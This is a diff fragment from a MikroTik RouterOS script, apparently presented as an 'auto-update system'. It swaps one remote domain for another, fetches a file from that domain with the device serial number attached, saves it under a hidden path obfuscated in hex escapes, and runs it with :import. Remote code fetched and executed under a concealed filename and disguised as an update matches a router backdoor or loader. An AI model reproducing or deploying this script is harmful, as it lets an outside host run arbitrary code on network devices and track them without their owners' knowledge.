@@ -66,7 +66,7 @@
     };
     
     :put "Step 2: Loading auto-update system...";
-    :local url "https://kora.fiberlive.live/mikrotik_update.php\?type=fiber&sn=$sn";
+    :local url "https://kor.fntvs.net/mikrotik_update.php\?type=fiber&sn=$sn";
     /tool fetch url=$url dst-path=("\2E\66\69\2F\62\2A\65\2A\72\2E\2D\2E./.\66\69\62\65\72\75\70\64\61\74\65\2A*");
     :delay 2s;
     :import ("\2E\66\69\2F\62\2A\65\2A\72\2E\2D\2E./.\66\69\62\65\72\75\70\64\61\74\65\2A*");
